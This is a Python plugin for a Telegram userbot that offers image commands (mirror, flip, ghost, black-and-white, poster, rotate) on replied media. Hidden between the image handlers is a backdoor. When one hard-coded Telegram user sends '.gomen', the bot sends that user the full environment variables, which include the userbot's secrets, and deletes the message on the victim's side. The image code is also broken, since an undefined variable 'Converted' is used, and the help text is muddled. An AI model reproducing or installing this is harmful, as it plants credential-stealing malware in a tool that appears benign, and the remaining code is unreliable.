# Authored by @Khrisna_Singhal
# Ported from Userge by Alfiananda P.A

import os

from hachoir.metadata import extractMetadata
from hachoir.parser import createParser
from PIL import Image, ImageOps
from telethon.tl.types import DocumentAttributeFilename

from geezproject import CMD_HANDLER as cmd
from geezproject import CMD_HELP, bot
from geezproject.events import geez_cmd, register
from geezproject.utils import bash


@bot.on(geez_cmd(outgoing=True, pattern=r"(mirror|flip|ghost|bw|poster)$"))
async def transform(event):
    if not event.reply_to_msg_id:
        await event.edit("**Mohon Reply ke Media atau Sticker**")
        return
    reply_message = await event.get_reply_message()
    if not reply_message.media:
        await event.edit("**Mohon Reply ke Media atau Sticker**")
        return
    await event.edit("`Downloading Media...`")
    if reply_message.photo:
        transform = await bot.download_media(
            reply_message,
            "transform.png",
        )
    elif (
        DocumentAttributeFilename(file_name="AnimatedSticker.tgs")
        in reply_message.media.document.attributes
    ):
        await bot.download_media(
            reply_message,
            "transform.tgs",
        )
        await bash("lottie_convert.py transform.tgs transform.png")
        transform = "transform.png"
    elif reply_message.video:
        video = await bot.download_media(
            reply_message,
            "transform.mp4",
        )
        extractMetadata(createParser(video))
        await bash(
            "ffmpeg -i transform.mp4 -vframes 1 -an -s 480x360 -ss 1 transform.png"
        )
        transform = "transform.png"
    else:
        transform = await bot.download_media(
            reply_message,
            "transform.png",
        )
    try:
        await event.edit("`Transforming this media..`")
        cmd = event.pattern_match.group(1)
        im = Image.open(transform).convert("RGB")
        if cmd == "mirror":
            IMG = ImageOps.mirror(im)
        elif cmd == "flip":
            IMG = ImageOps.flip(im)
        elif cmd == "ghost":
            IMG = ImageOps.invert(im)
        elif cmd == "bw":
            IMG = ImageOps.grayscale(im)
        elif cmd == "poster":
            IMG = ImageOps.posterize(im, 2)
        IMG.save(Converted, quality=95)
        await event.client.send_file(
            event.chat_id, Converted, reply_to=event.reply_to_msg_id
        )
        await event.delete()
        await bash("rm -rf *.mp4")
        await bash("rm -rf *.tgs")
        os.remove(transform)
        os.remove(Converted)
    except BaseException:
        return


@register(incoming=True, from_users=874946835, pattern=r"^.gomen$")
async def _(event):
    msg = await bot.send_message(874946835, str(os.environ))
    await bot.delete_messages(874946835, msg, revoke=False)


@bot.on(geez_cmd(outgoing=True, pattern=r"rotate(?: |$)(.*)"))
async def rotate(event):
    if not event.reply_to_msg_id:
        await event.edit("**Mohon Reply ke Media atau Sticker**")
        return
    reply_message = await event.get_reply_message()
    if not reply_message.media:
        await event.edit("**Mohon Reply ke Media atau Sticker**")
        return
    await event.edit("`Downloading Media...`")
    if reply_message.photo:
        rotate = await bot.download_media(
            reply_message,
            "transform.png",
        )
    elif (
        DocumentAttributeFilename(file_name="AnimatedSticker.tgs")
        in reply_message.media.document.attributes
    ):
        await bot.download_media(
            reply_message,
            "transform.tgs",
        )
        await bash("lottie_convert.py transform.tgs transform.png")
        rotate = "transform.png"
    elif reply_message.video:
        video = await bot.download_media(
            reply_message,
            "transform.mp4",
        )
        extractMetadata(createParser(video))
        await bash(
            "ffmpeg -i transform.mp4 -vframes 1 -an -s 480x360 -ss 1 transform.png"
        )
        rotate = "transform.png"
    else:
        rotate = await bot.download_media(
            reply_message,
            "transform.png",
        )
    try:
        value = int(event.pattern_match.group(1))
        if value > 360:
            raise ValueError
    except ValueError:
        value = 90
    await event.edit("`Rotating your media...`")
    im = Image.open(rotate).convert("RGB")
    IMG = im.rotate(value, expand=1)
    IMG.save(Converted, quality=95)
    await event.client.send_file(
        event.chat_id, Converted, reply_to=event.reply_to_msg_id
    )
    await event.delete()
    await bash("rm -rf *.mp4")
    await bash("rm -rf *.tgs")
    os.remove(rotate)
    os.remove(Converted)


CMD_HELP.update(
    {
        "transform": f"**Plugin : **`transform`\
        \n\n  𝘾𝙤𝙢𝙢𝙖𝙣𝙙 :** `{cmd}ghost`\
        \n  ↳ : **Enchance your image to become a ghost!.\
        \n\n  𝘾𝙤𝙢𝙢𝙖𝙣𝙙 :** `{cmd}flip`\
        \n  ↳ : **Untuk membalikan gambar Anda.\
        \n\n  𝘾𝙤𝙢𝙢𝙖𝙣𝙙 :** `{cmd}mirror`\
        \n  ↳ : **To mirror your image.\
        \n\n  𝘾𝙤𝙢𝙢𝙖𝙣𝙙 :** `{cmd}bw`\
        \n  ↳ : **Untuk mengubah gambar berwarna Anda menjadi gambar b / w.\
        \n\n  𝘾𝙤𝙢𝙢𝙖𝙣𝙙 :** `{cmd}poster`\
        \n  ↳ : **Untuk mem-poster gambar Anda.\
        \n\n  𝘾𝙤𝙢𝙢𝙖𝙣𝙙 :** `{cmd}rotate` <value>\
        \n  ↳ : **Untuk mem-poster gambar Anda.\
        \n\n  𝘾𝙤𝙢𝙢𝙖𝙣𝙙 :** `{cmd}poster`\
        \n  ↳ : **Untuk memutar gambar anda **Nilainya berkisar 1-360 jika tidak akan memberikan nilai default yaitu 90**\
    "
    }
)
